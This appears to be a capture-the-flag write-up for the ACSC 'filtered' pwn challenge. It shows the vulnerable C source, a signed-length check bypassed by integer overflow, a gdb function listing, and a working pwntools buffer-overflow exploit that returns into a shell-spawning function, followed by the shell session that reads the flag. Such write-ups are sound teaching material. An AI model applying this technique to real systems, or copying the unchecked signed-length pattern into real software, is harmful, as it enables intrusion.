# filtered (pwn-100)

## Summary

We are given a binary file and its source code. Our mission is to connect to server, exploit it and get the flag.

```
nc filtered.chal.acsc.asia 9001
```

```c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Call this function! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  exit(0);
}

/* Print `msg` */
void print(const char *msg) {
  write(1, msg, strlen(msg));
}

/* Print `msg` and read `size` bytes into `buf` */
void readline(const char *msg, char *buf, size_t size) {
  char c;
  print(msg);
  for (size_t i = 0; i < size; i++) {
    if (read(0, &c, 1) <= 0) {
      print("I/O Error\n");
      exit(1);
    } else if (c == '\n') {
      buf[i] = '\0';
      break;
    } else {
      buf[i] = c;
    }
  }
}

/* Print `msg` and read an integer value */
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}

/* Entry point! */
int main() {
  int length;
  char buf[0x100];

  /* Read and check length */
  length = readint("Size: ");
  if (length > 0x100) {
    print("Buffer overflow detected!\n");
    exit(1);
  }

  /* Read data */
  readline("Data: ", buf, length);
  print("Bye!\n");

  return 0;
}
```

Quickly peeking the source code, it turned out that this is a bof challenge.

## Solution

```c
/* Read and check length */
length = readint("Size: ");
if (length > 0x100) {
	print("Buffer overflow detected!\n");
	exit(1);
}
```

It's a bit tricky here. To bypass this snippet, we need to ensure that `length <= 0x100`. I try some random value like `1111111111111111` to make it negative (integer overflow).

Then, fire up our `gdb` and find the address of `win()` function.

```c
pwndbg> i func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401090  write@plt
0x00000000004010a0  strlen@plt
0x00000000004010b0  read@plt
0x00000000004010c0  execve@plt
0x00000000004010d0  atoi@plt
0x00000000004010e0  exit@plt
0x00000000004010f0  _start
0x0000000000401120  _dl_relocate_static_pie
0x0000000000401130  deregister_tm_clones
0x0000000000401160  register_tm_clones
0x00000000004011a0  __do_global_dtors_aux
0x00000000004011d0  frame_dummy
0x00000000004011d6  win 	<= our address is right here
0x0000000000401217  print
0x000000000040124a  readline
0x00000000004012e5  readint
0x000000000040131b  main
0x0000000000401390  __libc_csu_init
0x0000000000401400  __libc_csu_fini
0x0000000000401408  _fini
```

There is no `ALSR` in this challenge so it's over:

```python
from pwn import *

r = remote('filtered.chal.acsc.asia', 9001)

print(r.recvline())
print(r.recv())

payload = b'1'*0x10 + b'a'*280 + p64(0x4011d6)
r.sendline(payload)

print(r.recv())
r.interactive()
```

Exploit:

```
[+] Opening connection to filtered.chal.acsc.asia on port 9001: Done
b'== proof-of-work: disabled ==\n'
b'Size: '
b'Data: '
[*] Switching to interactive mode
Bye!
$ ls
filtered
flag-08d995360bfb36072f5b6aedcc801cd7.txt
$ cat flag-08d995360bfb36072f5b6aedcc801cd7.txt
ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}
```
